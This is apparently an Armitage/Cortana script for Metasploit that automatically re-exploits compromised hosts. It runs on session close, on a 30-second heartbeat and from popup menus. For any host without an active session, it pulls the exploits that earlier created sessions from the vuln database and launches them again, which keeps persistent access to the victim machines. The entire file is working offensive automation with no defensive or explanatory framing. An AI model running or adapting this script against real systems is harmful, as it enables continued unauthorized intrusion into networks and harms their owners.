on session_close {
  rexploit($2['host']);
}

popup host_top {
  menu "Misc" {
    item "Re-Exploit" {
      rexploit($1);
		}
  }
}

popup attacks {
  item "Blah" {
    foreach %session(call('db.sessions')['sessions']) {
      println(find_exploits($host));
    }
    #foreach $host (hosts()) {
    #  println($host);
    #  println(size(host_sessions($host));
    #}
  }
}

on heartbeat_30s {
  foreach %host(call('db.hosts')['hosts']) {
    rexploit(%host['address']);
  }
}

popup attacks {
  menu "Misc" {
    item "Re-Exploit" {
      foreach %host (call("db.hosts")["hosts"]) {
        rexploit(%host['address']);
      }
    }
  }
}

sub rexploit {
  if(size(host_sessions($1)) > 0) {
    println("Session currently active for $1");
  } else {
    foreach $exploit(find_exploits($1)) {
      println("Launching $exploit against $1")
      exploit($exploit, $1, %(), 0, 1);
    }
  }
}


sub find_exploits {
  local('@exploits');

  foreach %vuln(call("db.vulns")['vulns']) {
    if(%vuln['host'] eq $1) {
      if(%vuln['info'] ismatch 'Exploited by ([^\s]+) to create Session \d+') {
        if(matched()[0] !in @exploits) {
          push(@exploits, matched()[0]);
        }
      }
    }
  }

  return @exploits;
}
